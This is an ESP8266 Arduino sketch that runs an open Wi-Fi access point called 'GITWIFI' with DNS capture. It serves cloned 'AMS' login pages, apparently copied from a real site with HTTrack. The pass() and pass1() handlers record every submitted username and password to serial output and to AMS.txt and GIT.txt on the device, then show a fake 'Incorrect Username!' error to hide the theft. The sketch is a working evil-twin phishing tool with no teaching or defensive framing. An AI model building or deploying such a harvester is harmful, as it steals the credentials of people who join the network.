
/*
   ESP8266 SPIFFS HTML Web Page with JPEG, PNG Image

*/

#include <ESP8266WiFi.h>
#include "./DNSServer.h" 
#include <ESP8266WebServer.h>
#include <FS.h>   //Include File System Headers

String html ="<!DOCTYPE HTML>\n<html>\n\n<!-- Mirrored from 10.1.1.2:4000/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Dec 2017 04:31:06 GMT -->\n<!-- Added by HTTrack --><meta http-equiv=\"content-type\" content=\"text/html;charset=UTF-8\" /><!-- /Added by HTTrack -->\n<head>\n<title>AMS | Sign In</title>\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<script type=\"application/x-javascript\"> addEventListener(\"load\", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>\n <!-- Bootstrap Core CSS -->\n<link href=\"css/bootstrap.min.css\" rel='stylesheet' type='text/css' />\n<!-- Custom CSS -->\n<link href=\"css/style.css\" rel='stylesheet' type='text/css' />\n<!-- Graph CSS -->\n<link href=\"css/font-awesome.css\" rel=\"stylesheet\"> \n<!-- jQuery -->\n<!-- lined-icons -->\n<link rel=\"stylesheet\" href=\"css/icon-font.min.css\" type='text/css' />\n<!-- //lined-icons -->\n<!-- chart -->\n<script src=\"js/Chart.js\"></script>\n<!-- //chart -->\n<!--animate-->\n<link href=\"css/animate.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\">\n<script src=\"js/wow.min.js\"></script>\n\t<script>\n\t\t new WOW().init();\n\t</script>\n<!--//end-animate-->\n<!----webfonts--->\n<link href='../fonts.googleapis.com/css3821.css?family=Cabin:400,400italic,500,500italic,600,600italic,700,700italic' rel='stylesheet' type='text/css'>\n<!---//webfonts---> \n <!-- Meters graphs -->\n<script src=\"js/jquery-1.10.2.min.js\"></script>\n<!-- Placed js at the end of the document so the pages load faster -->\n\n</head> \n   \n <body class=\"sign-in-up\">\n    <section>\n\t\t\t<div id=\"page-wrapper\" class=\"sign-in-wrapper\">\n\t\t\t\t<div class=\"graphs\">\n\t\t\t\t\t<div class=\"sign-in-form\">\n\t\t\t\t\t\t<div class=\"sign-in-form-top\">\n\t\t\t\t\t\t\t<p><span>Sign In </span> </p>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"signin\">\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t<form action =\"checklogin.html\" method=\"GET\">\n\t\t\t\t\t\t\t<div class=\"log-input\">\n\t\t\t\t\t\t\t\t<div class=\"log-input-left\">\n\t\t\t\t\t\t\t\t   <input type=\"text\" class=\"user\"  name=\"u\" placeholder=\" Email Address\" autofocus />\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"log-input\">\n\t\t\t\t\t\t\t\t<div class=\"log-input-left\">\n\t\t\t\t\t\t\t\t   <input type=\"password\" class=\"lock\" name=\"p\" placeholder=\"Your Password\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"signin-rit\">\n\t\t\t\t\t\t\t\t<a href=\"forgot_password.html\"> Forgot Password ?</a>\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<input type=\"submit\" onclick=\"writeToPage()\" value=\"Login to your account\">\n\n\t\t\t\t\t\t</form>\n\t\t\t\t\t\t\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t</section>\n\t<center>\n\n</center>\n<script src=\"js/jquery.nicescroll.js\"></script>\n<script src=\"js/data.js\"></script>\n<script src=\"js/scripts.js\"></script>\n<!-- Bootstrap Core JavaScript -->\n   <script src=\"js/bootstrap.min.js\"></script>\n   \n<script type=\"text/javascript\" language=\"javascript\">\n\t\t\t\t\t\n\nfunction writeToPage(){\n\nvar user = document.getElementById(\"username\").value;\nvar pass = document.getElementById(\"password\").value;\nvar html = http://10.1.1.1:4000/data?u=+user+\"&p=\"+pass\nvar xhttp = new XMLHttpRequest();\nxhttp.open(\"GET\", html, true);\n\nxhttp.send();\nvar response = JSON.parse(xhttp.responseText);\t\t\n\n\n\t\t\t\t\t\t\t\t\n}\n\n\n\t\t</script>\n</body>\n\n\n</html>\n";
//String html1 ="<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\t<title>Login V1</title>\n\t<meta charset=\"UTF-8\">\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<!--===============================================================================================-->\t\n\t<link rel=\"icon\" type=\"image/png\" href=\"images/icons/favicon.ico\"/>\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/bootstrap/css/bootstrap.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"fonts/font-awesome-4.7.0/css/font-awesome.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/animate/animate.css\">\n<!--===============================================================================================-->\t\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/css-hamburgers/hamburgers.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/select2/select2.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"css/util.css\">\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\">\n<!--===============================================================================================-->\n</head>\n<body>\n\t\n\t<div class=\"limiter\">\n\t\t<div class=\"container-login100\">\n\t\t\t<div class=\"wrap-login100\">\n\t\t\t\t<div class=\"login100-pic js-tilt\" data-tilt>\n\t\t\t\t\t<img src=\"images/img-01.png\" alt=\"IMG\">\n\t\t\t\t</div>\n\n\t\t\t\t\n\t\t\t\t<form action =\"checklogin.html\" method=\"GET\">\n\t\t\t\t\t<span class=\"login100-form-title\">\n\t\t\t\t\t\tMember Login\n\t\t\t\t\t</span>\n\n\t\t\t\t\t<div class=\"wrap-input100 validate-input\" data-validate = \"Valid email is required: ex@abc.xyz\">\n\t\t\t\t\t\t<input class=\"input100\" type=\"text\" name=\"u\" placeholder=\"Email\">\n\t\t\t\t\t\t<span class=\"focus-input100\"></span>\n\t\t\t\t\t\t<span class=\"symbol-input100\">\n\t\t\t\t\t\t\t<i class=\"fa fa-envelope\" aria-hidden=\"true\"></i>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<div class=\"wrap-input100 validate-input\" data-validate = \"Password is required\">\n\t\t\t\t\t\t<input class=\"input100\" type=\"password\" name=\"p\" placeholder=\"Password\">\n\t\t\t\t\t\t<span class=\"focus-input100\"></span>\n\t\t\t\t\t\t<span class=\"symbol-input100\">\n\t\t\t\t\t\t\t<i class=\"fa fa-lock\" aria-hidden=\"true\"></i>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</div>\n\t\t\t\t\t\n\t\t\t\t\t<div class=\"container-login100-form-btn\">\n\t\t\t\t\t\t<button  type=\"submit\" class=\"login100-form-btn\">\n\t\t\t\t\t\t\tLogin\n\t\t\t\t\t\t</button>\n\t\t\t\t\t\t\n\t\t\t\t\t</div>\n\n\t\t\t\t\t\n\n\t\t\t\t\t\n\t\t\t\t</form>\n\t\t\t</div>\n\t\t</div>\n\t</div>\n\t\n\t\n\n\t\n<!--===============================================================================================-->\t\n\t<script src=\"vendor/jquery/jquery-3.2.1.min.js\"></script>\n<!--===============================================================================================-->\n\t<script src=\"vendor/bootstrap/js/popper.js\"></script>\n\t<script src=\"vendor/bootstrap/js/bootstrap.min.js\"></script>\n<!--===============================================================================================-->\n\t<script src=\"vendor/select2/select2.min.js\"></script>\n<!--===============================================================================================-->\n\t<script src=\"vendor/tilt/tilt.jquery.min.js\"></script>\n\t<script >\n\t\t$('.js-tilt').tilt({\n\t\t\tscale: 1.1\n\t\t})\n\t</script>\n<!--===============================================================================================-->\n\t<script src=\"js/main.js\"></script>\n\n</body>\n</html>";
String html1 ="<!DOCTYPE HTML>\n<html>\n\n<!-- Mirrored from 10.1.1.2:4000/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Dec 2017 04:31:06 GMT -->\n<!-- Added by HTTrack --><meta http-equiv=\"content-type\" content=\"text/html;charset=UTF-8\" /><!-- /Added by HTTrack -->\n<head>\n<title>AMS | Sign In</title>\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />\n<script type=\"application/x-javascript\"> addEventListener(\"load\", function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } </script>\n <!-- Bootstrap Core CSS -->\n<link href=\"css/bootstrap.min.css\" rel='stylesheet' type='text/css' />\n<!-- Custom CSS -->\n<link href=\"css/style.css\" rel='stylesheet' type='text/css' />\n<!-- Graph CSS -->\n<link href=\"css/font-awesome.css\" rel=\"stylesheet\"> \n<!-- jQuery -->\n<!-- lined-icons -->\n<link rel=\"stylesheet\" href=\"css/icon-font.min.css\" type='text/css' />\n<!-- //lined-icons -->\n<!-- chart -->\n<script src=\"js/Chart.js\"></script>\n<!-- //chart -->\n<!--animate-->\n<link href=\"css/animate.css\" rel=\"stylesheet\" type=\"text/css\" media=\"all\">\n<script src=\"js/wow.min.js\"></script>\n\t<script>\n\t\t new WOW().init();\n\t</script>\n<!--//end-animate-->\n<!----webfonts--->\n<link href='../fonts.googleapis.com/css3821.css?family=Cabin:400,400italic,500,500italic,600,600italic,700,700italic' rel='stylesheet' type='text/css'>\n<!---//webfonts---> \n <!-- Meters graphs -->\n<script src=\"js/jquery-1.10.2.min.js\"></script>\n<!-- Placed js at the end of the document so the pages load faster -->\n\n</head> \n   \n <body class=\"sign-in-up\">\n    <section>\n\t\t\t<div id=\"page-wrapper\" class=\"sign-in-wrapper\">\n\t\t\t\t<div class=\"graphs\">\n\t\t\t\t\t<div class=\"sign-in-form\">\n\t\t\t\t\t\t<div class=\"sign-in-form-top\">\n\t\t\t\t\t\t\t<p><span>Sign In </span> </p>\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<div class=\"signin\">\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t<form action =\"checklogin.html\" method=\"GET\">\n\t\t\t\t\t\t\t<div class=\"log-input\">\n\t\t\t\t\t\t\t\t<div class=\"log-input-left\">\n\t\t\t\t\t\t\t\t   <input type=\"text\" class=\"user\"  name=\"u\" placeholder=\" Email Address\" autofocus />\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"log-input\">\n\t\t\t\t\t\t\t\t<div class=\"log-input-left\">\n\t\t\t\t\t\t\t\t   <input type=\"password\" class=\"lock\" name=\"p\" placeholder=\"Your Password\"/>\n\t\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\t<div class=\"signin-rit\">\n\t\t\t\t\t\t\t\t<a href=\"forgot_password.html\"> Forgot Password ?</a>\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t<div class=\"clearfix\"> </div>\n\t\t\t\t\t\t\t</div>\n\t\t\t\t\t\t<input type=\"submit\" onclick=\"writeToPage()\" value=\"Login to your account\">\n\n\t\t\t\t\t\t</form>\n\t\t\t\t\t\t\n\t\t\t\t\t\t</div>\n\t\t\t\t\t\t\n\t\t\t\t\t</div>\n\t\t\t\t</div>\n\t\t\t</div>\n\t</section>\n\t<center>\n\n</center>\n<script src=\"js/jquery.nicescroll.js\"></script>\n<script src=\"js/data.js\"></script>\n<script src=\"js/scripts.js\"></script>\n<!-- Bootstrap Core JavaScript -->\n   <script src=\"js/bootstrap.min.js\"></script>\n   \n<script type=\"text/javascript\" language=\"javascript\">\n\t\t\t\t\t\n\nfunction writeToPage(){\n\nvar user = document.getElementById(\"username\").value;\nvar pass = document.getElementById(\"password\").value;\nvar html = http://10.1.1.1:4000/data?u=+user+\"&p=\"+pass\nvar xhttp = new XMLHttpRequest();\nxhttp.open(\"GET\", html, true);\n\nxhttp.send();\nvar response = JSON.parse(xhttp.responseText);\t\t\n\n\n\t\t\t\t\t\t\t\t\n}\n\n\n\t\t</script>\n</body>\n\n\n</html>\n";
//String html ="<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n\t<title>Login V1</title>\n\t<meta charset=\"UTF-8\">\n\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<!--===============================================================================================-->\t\n\t<link rel=\"icon\" type=\"image/png\" href=\"images/icons/favicon.ico\"/>\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/bootstrap/css/bootstrap.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"fonts/font-awesome-4.7.0/css/font-awesome.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/animate/animate.css\">\n<!--===============================================================================================-->\t\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/css-hamburgers/hamburgers.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"vendor/select2/select2.min.css\">\n<!--===============================================================================================-->\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"css/util.css\">\n\t<link rel=\"stylesheet\" type=\"text/css\" href=\"css/main.css\">\n<!--===============================================================================================-->\n</head>\n<body>\n\t\n\t<div class=\"limiter\">\n\t\t<div class=\"container-login100\">\n\t\t\t<div class=\"wrap-login100\">\n\t\t\t\t<div class=\"login100-pic js-tilt\" data-tilt>\n\t\t\t\t\t<img src=\"images/img-01.png\" alt=\"IMG\">\n\t\t\t\t</div>\n\n\t\t\t\t\n\t\t\t\t<form action =\"checklogin.html\" method=\"GET\">\n\t\t\t\t\t<span class=\"login100-form-title\">\n\t\t\t\t\t\tMember Login\n\t\t\t\t\t</span>\n\n\t\t\t\t\t<div class=\"wrap-input100 validate-input\" data-validate = \"Valid email is required: ex@abc.xyz\">\n\t\t\t\t\t\t<input class=\"input100\" type=\"text\" name=\"u\" placeholder=\"Email\">\n\t\t\t\t\t\t<span class=\"focus-input100\"></span>\n\t\t\t\t\t\t<span class=\"symbol-input100\">\n\t\t\t\t\t\t\t<i class=\"fa fa-envelope\" aria-hidden=\"true\"></i>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</div>\n\n\t\t\t\t\t<div class=\"wrap-input100 validate-input\" data-validate = \"Password is required\">\n\t\t\t\t\t\t<input class=\"input100\" type=\"password\" name=\"p\" placeholder=\"Password\">\n\t\t\t\t\t\t<span class=\"focus-input100\"></span>\n\t\t\t\t\t\t<span class=\"symbol-input100\">\n\t\t\t\t\t\t\t<i class=\"fa fa-lock\" aria-hidden=\"true\"></i>\n\t\t\t\t\t\t</span>\n\t\t\t\t\t</div>\n\t\t\t\t\t\n\t\t\t\t\t<div class=\"container-login100-form-btn\">\n\t\t\t\t\t\t<button  type=\"submit\" class=\"login100-form-btn\">\n\t\t\t\t\t\t\tLogin\n\t\t\t\t\t\t</button>\n\t\t\t\t\t\t\n\t\t\t\t\t</div>\n\n\t\t\t\t\t\n\n\t\t\t\t\t\n\t\t\t\t</form>\n\t\t\t</div>\n\t\t</div>\n\t</div>\n\t\n\t\n\n\t\n<!--===============================================================================================-->\t\n\t<script src=\"vendor/jquery/jquery-3.2.1.min.js\"></script>\n<!--===============================================================================================-->\n\t<script src=\"vendor/bootstrap/js/popper.js\"></script>\n\t<script src=\"vendor/bootstrap/js/bootstrap.min.js\"></script>\n<!--===============================================================================================-->\n\t<script src=\"vendor/select2/select2.min.js\"></script>\n<!--===============================================================================================-->\n\t<script src=\"vendor/tilt/tilt.jquery.min.js\"></script>\n\t<script >\n\t\t$('.js-tilt').tilt({\n\t\t\tscale: 1.1\n\t\t})\n\t</script>\n<!--===============================================================================================-->\n\t<script src=\"js/main.js\"></script>\n\n</body>\n</html>";

//ESP AP Mode configuration
const char *ssid = "GITWIFI";

const byte        DNS_PORT = 53;          // Capture DNS requests on port 53
DNSServer         dnsServer;
ESP8266WebServer server(4000);

ESP8266WebServer server1(80);

void handleRoot() {
  server.sendHeader("Location", "/index.html", true);  //Redirect to our html web page
  server.send(200, "text/html", html);
}

void handleRoot1() {
 server1.sendHeader("Location", "/index1.html", true);  //Redirect to our html web page
  server1.send(200, "text/html",html1 );
}

void handleWebRequests() {
  if (loadFromSpiffs(server.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server.uri();
  message += "\nMethod: ";
  message += (server.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server.args();
  message += "\n";
  for (uint8_t i = 0; i < server.args(); i++) {
    message += " NAME:" + server.argName(i) + "\n VALUE:" + server.arg(i) + "\n";
  }
  server.send(404, "text/plain", message);
  Serial.println(message);
}


void handleWebRequests1() {
  if (loadFromSpiffs1(server1.uri())) return;
  String message = "File Not Detected\n\n";
  message += "URI: ";
  message += server1.uri();
  message += "\nMethod: ";
  message += (server1.method() == HTTP_GET) ? "GET" : "POST";
  message += "\nArguments: ";
  message += server1.args();
  message += "\n";
  for (uint8_t i = 0; i < server1.args(); i++) {
    message += " NAME:" + server1.argName(i) + "\n VALUE:" + server1.arg(i) + "\n";
  }
  server1.send(404, "text/plain", message);
  Serial.println(message);
}

void setup() {
  delay(1000);
  Serial.begin(115200);
  Serial.println();

  //Initialize File System
  SPIFFS.begin();
  Serial.println("File System Initialized");
  IPAddress ip(10, 1, 1, 1);
  IPAddress gateway(10, 1, 1, 1);
  IPAddress subnet(255, 255, 255, 0);
  WiFi.softAPConfig(ip, gateway, subnet);
  //Initialize AP Mode
  WiFi.softAP(ssid);  //Password not used
  
  dnsServer.start(DNS_PORT, "*", ip);
  
  IPAddress myIP = WiFi.softAPIP();
  Serial.print("Web Server IP:");
  Serial.println(myIP);

//  Initialize Webserver
  server.on("/", handleRoot);
  server.onNotFound(handleWebRequests); //Set setver all paths are not found so we can handle as per URI
  server.on("/checklogin.html", pass);
   server.on("/index.html", handleRoot);
  server.begin();
   server.on("/index1.html", handleRoot1);
  server1.on("/", handleRoot1);
  server1.onNotFound(handleWebRequests1); //Set setver all paths are not found so we can handle as per URI
  server1.on("/checklogin.html", pass1);
  server1.begin();
}

void pass()
{

  String Password = server.arg("p");
  String  Username = server.arg("u");
  Serial.println("");
  Serial.print("USERNAME AMS:");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD AMS:");
  Serial.print(Password);
  server.send(200, "text/html", "<script>alert(\"Incorrect Username!\");</script><script>window.location.assign(\"index.html\");</script>");
  File f = SPIFFS.open("/AMS.txt", "a");
if (!f) {
    Serial.println("file open failed");
     File f = SPIFFS.open("/AMS.txt", "a ");
}
    f.println("");
      f.print("USERNAME AMS:");
     f.print(Username);
      f.println("");
      f.print("PASSWORD AMS:");
     f.print(Password);
f.close();

}

void pass1()
{

  String Password = server1.arg("p");
  String  Username = server1.arg("u");
  Serial.println("");
  Serial.print("USERNAME GIT :");
  Serial.print(Username);
  Serial.println("");
  Serial.print("PASSWORD GIT :");
  Serial.print(Password);
  Serial.println("************************");


  server1.send(200, "text/html", "<script>alert(\"Incorrect Username!\");</script><script>window.location.assign(\"index1.html\");</script>");


 
File f = SPIFFS.open("/GIT.txt", "a");
if (!f) {
    Serial.println("file open failed");
     File f = SPIFFS.open("/GIT.txt", "a ");
}
    f.println("");
      f.print("USERNAME AMS:");
     f.print(Username);
      f.println("");
      f.print("PASSWORD AMS:");
     f.print(Password);
f.close();

}



void loop() {
server.handleClient();
  server1.handleClient();
  // dnsServer.processNextRequest();
}

bool loadFromSpiffs(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
 // else if (path.endsWith(".html")) dataType = "text/html";
 // else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server.hasArg("download")) dataType = "application/octet-stream";
  if (server.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}



bool loadFromSpiffs1(String path) {
  String dataType = "text/plain";
  if (path.endsWith("/")) path += "index1.htm";

  if (path.endsWith(".src")) path = path.substring(0, path.lastIndexOf("."));
  else if (path.endsWith(".html")) dataType = "text/html";
  else if (path.endsWith(".htm")) dataType = "text/html";
  else if (path.endsWith(".css")) dataType = "text/css";
  else if (path.endsWith(".js")) dataType = "application/javascript";
  else if (path.endsWith(".png")) dataType = "image/png";
  else if (path.endsWith(".gif")) dataType = "image/gif";
  else if (path.endsWith(".jpg")) dataType = "image/jpeg";
  else if (path.endsWith(".ico")) dataType = "image/x-icon";
  else if (path.endsWith(".xml")) dataType = "text/xml";
  else if (path.endsWith(".pdf")) dataType = "application/pdf";
  else if (path.endsWith(".zip")) dataType = "application/zip";
  File dataFile = SPIFFS.open(path.c_str(), "r");
  if (server1.hasArg("download")) dataType = "application/octet-stream";
  if (server1.streamFile(dataFile, dataType) != dataFile.size()) {
  }

  dataFile.close();
  return true;
}
